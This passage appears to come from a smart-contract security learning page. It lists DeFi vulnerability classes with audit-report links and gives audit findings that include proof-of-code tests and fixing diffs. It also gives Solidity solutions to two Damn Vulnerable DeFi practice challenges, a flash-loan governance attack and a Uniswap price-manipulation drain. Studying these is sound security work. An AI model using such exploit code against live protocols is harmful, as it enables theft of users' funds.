For example, when an exchange is updated incorrectly. See: “[Unnecessary `updateExchangeRate` in `deposit` function incorrectly updates `exchangeRates` preventing withdraws and unfairly changing reward distribution](https://github.com/Cyfrin/6-thunder-loan-audit/blob/audit-data/audit-data/report.pdf)”.

### Oracle Manipulation

- **Spot Price Manipulation** This vulnerability arises when a protocol trust a decentralised exchange's spot pricing and lacks verification
- **Off-Chain Infrastructure** Oracle software must be hardened and compliant with security best practises such as the [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/). The Synthetix sKRW incident is an example, read more here: "[So you want to use a price oracle](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle)"
- **Centralized Oracles and Trust** Projects can also decide to implement a centralized oracle. This can lead to some problems, like:
    - Attackers may exploit authorised users to submit harmful data and misuse their position of privilege
    - Centralized Oracles may present an inherent risk as a result of compromised private keys
- **Decentralized Oracle Security** Participants who provide the Oracle system with (valid) data receive financial compensation. The participants are encouraged to offer the least expensive version of their service in order to increase their profit. How this get exploited:
    - **Freeloading** A node can replicate the values without validation by copying another oracle or off-chain component. A commit-reveal system may be simply implemented to avoid freeloading attacks for more complicated data streams
    - **Mirroring** Similar to Freeloading. Following a single node's reading from the centralised data source, additional participants (Sybil nodes) that mirror that data copy the values of that one node. The incentive for giving the information is doubled by the quantity of participants with a single data read

Example:

- See M-2: https://github.com/Cyfrin/6-thunder-loan-audit/blob/audit-data/audit-data/report.pdf

#### Mitigation

For pricing: It’s always advisable to rely on secure price oracle mechanism, like a Chainlink price feed with a UniSwap TWAP fallback oracle.

### Storage collision

- [See this scheme](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/storage-collision/diagrams/storageCollision.png)
- See: [StorageCollision.sol](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/storage-collision/StorageCollision.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and [StorageCollisionTest.t.sol](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/test/unit/StorageCollisionTest.t.sol).

### EVM compatibility

- zkSync and Ethereum
    - [Differences from Ethereum | zkSync Docs](https://docs.zksync.io/build/developer-reference/differences-with-ethereum.html)
    - [921 ETH Stuck in zkSync Era: Why Transfer() Function Fails?](https://medium.com/coinmonks/gemstoneido-contract-stuck-with-921-eth-an-analysis-of-why-transfer-does-not-work-on-zksync-era-d5a01807227d)
- Compare chains with: [EVM Diff](https://www.evmdiff.com/)

### Signature issues

- [Publick Key / Private Key Demo](https://github.com/anders94/public-private-key-demo)
- [Polygon Lack Of Balance Check Bugfix Review - $2.2m Bounty](https://medium.com/immunefi/polygon-lack-of-balance-check-bugfix-postmortem-2-2m-bounty-64ec66c24c7d)
    - Note: `ecrecovery` does not revert. Instead, it returns `0`. So, the result from this function must be checked.
- Signature Replay: [SignatureReplay.sol](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/signature-replay/SignatureReplay.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
    - Remediation: use nonce or deadline so that the signature can be used one time
    - See: [[H-3] Lack of replay protection in withdrawTokensToL1 allows withdrawals by signature to be replayed](https://github.com/Cyfrin/7-boss-bridge-audit/blob/audit-data/audit-data/2023-09-01-boss-bridge-audit.md#h-3-lack-of-replay-protection-in-withdrawtokenstol1-allows-withdrawals-by-signature-to-be-replayed)

### **Unbounded gas consumption**

- [[M-1] Withdrawals are prone to unbounded gas consumption due to return bombs](https://github.com/Cyfrin/7-boss-bridge-audit/blob/audit-data/audit-data/2023-09-01-boss-bridge-audit.md#m-1-withdrawals-are-prone-to-unbounded-gas-consumption-due-to-return-bombs)

### Maximal Extractable Value (MEV)

For every transaction, ask yourself: If someone sees this TX in the mempool, how can they abuse that knowledge?

Resources:

- Frontrun: [Frontran.sol](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Frontran.sol) + [front-running.svg](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/diagrams/front-running.svg) and [signature-front-run.svg](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/diagrams/signature-front-run.svg)
- [MEV: Maximal Extractable Value Pt. 1 | Galaxy](https://www.galaxy.com/insights/research/mev-how-flashboys-became-flashbots/)
- [MEV: Maximal Extractable Value Pt. 2 | Galaxy](https://www.galaxy.com/insights/research/mev-the-rise-of-the-builders/)
- Case study: [Curve suffers $70M exploit, but damage contained](https://blockworks.co/news/curve-suffers-exploit)

**Sandwich Attacks**

Essentially, the attacker will execute a simultaneous front-run and back-run, with the initial pending target transaction positioned between them.
- [sandwhich-attack-thunder-loan.svg](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/diagrams/sandwhich-attack-thunder-loan.svg)

Reports
- [Attacker can drain protocol tokens by sandwich attacking owner call to `setPositionWidth` and `unpause` to force redeployment of Beefy's liquidity into an unfavorable range](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-06-cyfrin-beefy-finance.md#attacker-can-drain-protocol-tokens-by-sandwich-attacking-owner-call-to-setpositionwidth-and-unpause-to-force-redeployment-of-beefys-liquidity-into-an-unfavorable-range)
- [5.1 Oracle updates can be manipulated to perform atomic front-running attack](https://consensys.io/diligence/audits/2020/06/bancor-v2-amm-security-audit/#oracle-updates-can-be-manipulated-to-perform-atomic-front-running-attack)

#### Mitigation

- Note: Obscurity ≠ Security
- Private / Dark mempool, an example: [Flashbots Protect](https://docs.flashbots.net/flashbots-protect/quick-start). Cons: speed; you have to trust it
- Add a lock to the function that can be frontran, like a boolean

### Governance Attack

- Case study: [Rekt - Tornado Cash Governance](https://rekt.news/tornado-gov-rekt/)

### Flash Loan Attacks

Reports
- [Selfie | Damn Vulnerable DeFi v4](#selfie)
- [[M-02] All yield generated in the IBT vault can be drained by performing a vault deflation attack using the flash loan functionality of the Principal Token contract | Spectra](https://code4rena.com/reports/2024-02-spectra#m-02-all-yield-generated-in-the-ibt-vault-can-be-drained-by-performing-a-vault-deflation-attack-using-the-flash-loan-functionality-of-the-principal-token-contract)
- [Attacker can destroy user voting power by setting `ERC721Power::totalPower` and all existing NFTs `currentPower` to 0 | Dexe](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md#attacker-can-destroy-user-voting-power-by-setting-erc721powertotalpower-and-all-existing-nfts-currentpower-to-0)

### Web2 Attacks

- [The Billion Dollar Exploit: Collecting Validators Private Keys via Web2 Attacks](https://0d.dwalletlabs.com/the-billion-dollar-exploit-collecting-validators-private-keys-via-web2-attacks-4a385a5bb70d)
- [M-01. Insufficient input validation on `SablierV2NFTDescriptor::safeAssetSymbol` allows an attacker to obtain stored XSS](https://codehawks.cyfrin.io/c/2024-05-Sablier/results?lt=contest&sc=reward&sj=reward&page=1&t=report)

### Inability to handle calls with non-zero `call.value`

This issue occurs when a smart contract lacks a `receive` or `fallback` function, making it unable to accept Ether (`ETH`) sent directly to the contract. Additionally, if critical functions are not marked as `payable`, the contract cannot process transactions that include Ether (`msg.value > 0`). This combination results in the contract being unable to handle calls that involve transferring ETH, limiting its ability to interact with other contracts or execute logic requiring non-zero Ether transfers.

So, if in the contract is present `msg.value` in a non `payable` function, but there is no `receive` or `fallback` function you have an issue.

Resources:
- [The AxelarBridgedGovernor contract cannot support non-zero value cross-chain calls](https://solodit.cyfrin.io/issues/the-axelarbridgedgovernor-contract-cannot-support-non-zero-value-cross-chain-calls-cantina-none-drips-pdf)

## Challenges solved

### Damn Vulnerable DeFi v4

#### Selfie

**Summary**

The function `emergencyExit(address receiver)` in the `SelfiePool` contract transfers the entire balance of the contract to the specified address. By using a flash loan to acquire the necessary voting power, it is possible to queue the action `emergencyExit(address)` targeting a specific address, in this case `recovery`. After queuing the action, wait for the required delay before calling `executeAction(actionId)` to meet the conditions. This will transfer the contract’s balance to the specified address.

<details>

<summary>Solution</summary>

```Solidity
...
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

...

    function test_selfie() public checkSolvedByPlayer {
        SelfieAttacker selfieAttacker = new SelfieAttacker(
            address(pool),
            address(token),
            address(governance),
            recovery
        );
        uint256 actionId = governance.getActionCounter();
        selfieAttacker.attack();

        // execute the action
        vm.warp(block.timestamp + governance.getActionDelay() + 1);
        governance.executeAction(actionId);
    }

...

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool public pool;
    DamnValuableVotes public token;
    SimpleGovernance public governance;
    address player;
    address recovery;

    constructor(
        address _pool,
        address _token,
        address _governance,
        address _recovery
    ) {
        pool = SelfiePool(_pool);
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
        player = msg.sender;
        recovery = _recovery;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            pool.maxFlashLoan(address(token)),
            data
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "msg.sender must be pool");
        require(tx.origin == player, "tx.origin must be player");

        token.delegate(address(this)); // with this operation, get the voting power
        governance.queueAction(address(pool), 0, data); // queue the action

        // return the loan
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

</details>

#### Puppet V2

**Summary**

It is possible to manipulate the price of the DVT token by exchanging a large amount of it for WETH on the Uniswap exchange of the DVT/WETH pair.

<details>

<summary>Solution</summary>

```Solidity
    function test_puppetV2() public checkSolvedByPlayer {
        console.log(
            "Initial WETH needed to swap all DVT tokens: ",
            lendingPool.calculateDepositOfWETHRequired(
                token.balanceOf(address(lendingPool)) / 10 ** 18
            )
        );

        address[] memory path;
        path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // Step 1. swap DVT for WETH to decrease the price of DVT
        token.approve(address(uniswapV2Router), token.balanceOf(player));
        uniswapV2Router.swapExactTokensForTokens(
            token.balanceOf(player),
            0,
            path,
            address(player),
            block.timestamp + 1 days
        );

        console.log(
            "New amount of WETH needed to swap all DVT tokens: ",
            lendingPool.calculateDepositOfWETHRequired(
                token.balanceOf(address(lendingPool)) / 10 ** 18
            )
        );

        // Step 2. get the remaining WETH needed for the swap
        weth.deposit{
            value: lendingPool.calculateDepositOfWETHRequired(
                token.balanceOf(address(lendingPool))
            ) - weth.balanceOf(player)
        }();

        // Step 3. use the WETH to borrow the DVT tokens
        uint256 wethNeeded = lendingPool.calculateDepositOfWETHRequired(
            token.balanceOf(address(lendingPool))
        );
        weth.approve(address(lendingPool), wethNeeded);
        lendingPool.borrow(token.balanceOf(address(lendingPool)));

        // Step 4. send the DVT tokens to the recovery account
        token.transfer(address(recovery), token.balanceOf(player));
    }
```

</details>

### Cyfrin CodeHawks First Flights

#### [First Flight #14: AirDropper](https://codehawks.cyfrin.io/c/2024-04-airdropper) H-02. Lack of a claim verification mechanism in the function `MerkleAirdrop::claim` results in the USDC protocol balance draining

**Summary**

The `claim` function in the MerkleAirdrop contract enables eligible users to claim their 25 USDC airdrop. However, the current implementation of the `MerkleAirdrop.sol` contract lacks a mechanism to prevent users from claiming the airdrop multiple times in the `MerkleAirdrop::claim` function, which could lead to draining the contract's USDC balance.

<details>

<summary>Affected code</summary>

[MerkleAirdrop.sol#L30-L40](https://github.com/Cyfrin/2024-04-airdropper/blob/main/src/MerkleAirdrop.sol#L30-L40)

```Solidity
    function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
        if (msg.value != FEE) {
            revert MerkleAirdrop__InvalidFeeAmount();
        }
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
        if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
            revert MerkleAirdrop__InvalidProof();
        }
        emit Claimed(account, amount);
        i_airdropToken.safeTransfer(account, amount);
    }
```

</details>

<details>

<summary>Proof of Code</summary>

Add the following test to the `MerkleAirdropTest.t.sol` test suite.

```Solidity
    function testUsersCanClaimMultipleTimes() public {
        uint256 startingBalance = token.balanceOf(collectorOne);
        vm.deal(collectorOne, airdrop.getFee() * 4);

        vm.startPrank(collectorOne);
        for (uint i = 0; i < 4; i++) {
            airdrop.claim{value: airdrop.getFee()}(
                collectorOne,
                amountToCollect,
                proof
            );
        }
        vm.stopPrank();

        uint256 endingBalance = token.balanceOf(collectorOne);
        assertEq(endingBalance - startingBalance, amountToSend);
    }
```

</details>

<details>

<summary>Solution</summary>

It is advisable to add a verification mechanism to make sure that an user can claim only its airdrop. An example is the following:

```diff
+    error MerkleAirdrop__AirdropAlreadyClaimed();
+    mapping(address => bool) private claimed; // Track claimed status
...

    function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
        if (msg.value != FEE) {
            revert MerkleAirdrop__InvalidFeeAmount();
        }
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
        if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
            revert MerkleAirdrop__InvalidProof();
        }
+       if (claimed[account]) { // Check if user already claimed
+           revert MerkleAirdrop__AirdropAlreadyClaimed();
+       }
+       claimed[account] = true; // Mark user as claimed
        emit Claimed(account, amount);
        i_airdropToken.safeTransfer(account, amount);
    }

```

</details>

#### [First Flight #13: Baba Marta](https://codehawks.cyfrin.io/c/2024-04-Baba-Marta) H-01. No restriction implemented in `MartenitsaToken::updateCountMartenitsaTokensOwner` allows any user to update any MartenitsaToken balance breaking the operativity and purpose of the protocol

**Summary**

If a user wants to buy a `MartenitsaToken`, it's supposed to call the `MartenitsaMarketplace::buyMartenitsa` function to purchase it, where there are the necessary checks to verify if the user has the requirements to do so. The balance of both the buyer and seller is updated by calling the `MartenitsaToken::updateCountMartenitsaTokensOwner` function.

However, a user can directly call the `MartenitsaToken::updateCountMartenitsaTokensOwner` function, bypassing any previous restriction, to update its own balance or that of any other user as there is no control over who is calling the function. This means that an attacker can negatively or positively influence not only its own balance, but also that of other users.

<details>

<summary>Affected code</summary>

[MartenitsaToken.sol#L57-L70](https://github.com/Cyfrin/2024-04-Baba-Marta/blob/main/src/MartenitsaToken.sol#L57-L70)

```Solidity
    /**
    * @notice Function to update the count of martenitsaTokens for a specific address.
    * @param owner The address of the owner.
    * @param operation Operation for update: "add" for +1 and "sub" for -1.
    */
@>  function updateCountMartenitsaTokensOwner(address owner, string memory operation) external {
@>      if (keccak256(abi.encodePacked(operation)) == keccak256(abi.encodePacked("add"))) {
            countMartenitsaTokensOwner[owner] += 1;
        } else if (keccak256(abi.encodePacked(operation)) == keccak256(abi.encodePacked("sub"))) {
            countMartenitsaTokensOwner[owner] -= 1;
        } else {
            revert("Wrong operation");
        }
    }
```

</details>

<details>

<summary>Proof of Code</summary>

You can test this by adding `testUnrestricted_updateCountMartenitsaTokensOwner()` to `MartenitsaToken.t.sol` test suite.

```Solidity
    function testUnrestricted_updateCountMartenitsaTokensOwner() public createMartenitsa {
        address newUser = makeAddr("newUser");
        address evilUser = makeAddr("evilUser");

        vm.startPrank(newUser);
        for (uint256 i = 0; i < 100; i++) {
            martenitsaToken.updateCountMartenitsaTokensOwner(newUser, "add");
        }
        vm.stopPrank();
        assert(martenitsaToken.getCountMartenitsaTokensOwner(newUser) == 100);

        vm.startPrank(evilUser);
        for (uint256 i = 0; i < 100; i++) {
            martenitsaToken.updateCountMartenitsaTokensOwner(newUser, "sub");
        }
        vm.stopPrank();
        assert(martenitsaToken.getCountMartenitsaTokensOwner(newUser) == 0);
    }
```

</details>

<details>

<summary>Solution</summary>

It is advisable to implement checks on the function `MartenitsaToken::updateCountMartenitsaTokensOwner` to check the origin of the function call. One possible solution is the following.

```diff
+import {MartenitsaMarketplace} from "./MartenitsaMarketplace.sol";

...

+   MartenitsaMarketplace private _martenitsaMarketplace;

...

+   function setMarketAddress(address martenitsaMarketplace) public onlyOwner {
+       _martenitsaMarketplace = MartenitsaMarketplace(martenitsaMarketplace);
+   }

...

    function updateCountMartenitsaTokensOwner(address owner, string memory operation) external {
+       require(msg.sender == address(_martenitsaMarketplace), "Unable to call this function");
        if (keccak256(abi.encodePacked(operation)) == keccak256(abi.encodePacked("add"))) {
            countMartenitsaTokensOwner[owner] += 1;
        } else if (keccak256(abi.encodePacked(operation)) == keccak256(abi.encodePacked("sub"))) {
            countMartenitsaTokensOwner[owner] -= 1;
        } else {
            revert("Wrong operation");
        }
    }
```

</details>

#### [First Flight #13: Baba Marta](https://codehawks.cyfrin.io/c/2024-04-Baba-Marta) M-01. `MartenitsaEvent::stopEvent` does not clear the list of partecipants not allowing recurring users to join new events

**Summary**

The `stopEvent` function in the `MartenitsaEvent` contract fails to remove participants from the list of participants after the event ends thus preventing recurring users from joining new events as their addresses remain stored in the `_participants` mapping.

<details>

<summary>Affected code</summary>

[MartenitsaToken.sol#L57-L65](https://github.com/Cyfrin/2024-04-Baba-Marta/blob/main/src/MartenitsaEvent.sol#L57-L65)

```Solidity
    /**
    * @notice Function to remove the producer role of the participants after the event is ended.
    */
    function stopEvent() external onlyOwner {
        require(block.timestamp >= eventEndTime, "Event is not ended");
        for (uint256 i = 0; i < participants.length; i++) {
@>          isProducer[participants[i]] = false;
@>      }
    }
```

</details>

<details>

<summary>Proof of Code</summary>

You can test this by adding `testJoinNewEvent()` to `MartenitsaToken.t.sol` test suite.

```Solidity
    function testJoinNewEvent() public eligibleForReward {
        martenitsaEvent.startEvent(1 days);

        vm.startPrank(bob);
        marketplace.collectReward();
        healthToken.approve(address(martenitsaEvent), 10 ** 18);
        martenitsaEvent.joinEvent();
        vm.stopPrank();

        vm.warp(block.timestamp + 1 days + 1);
        martenitsaEvent.stopEvent();

        //start a new event
        martenitsaEvent.startEvent(1 days);

        vm.startPrank(bob);
        marketplace.collectReward();
        healthToken.approve(address(martenitsaEvent), 10 ** 18);
        vm.expectRevert(bytes("You have already joined the event"));
        martenitsaEvent.joinEvent();
        vm.stopPrank();
    }
```

</details>

<details>

<summary>Solution</summary>

It is advisable to clear the list of partecipants after stopping an event to allow recurring users to join new events. An example to do so is the following.

```diff
    /**
     * @notice Function to remove the producer and partecipant roles of the participants after the event is ended.
     */
    function stopEvent() external onlyOwner {
        require(block.timestamp >= eventEndTime, "Event is not ended");
        for (uint256 i = 0; i < participants.length; i++) {
            isProducer[participants[i]] = false;
+           _participants[participants[i]] = false;
        }
    }
```

</details>
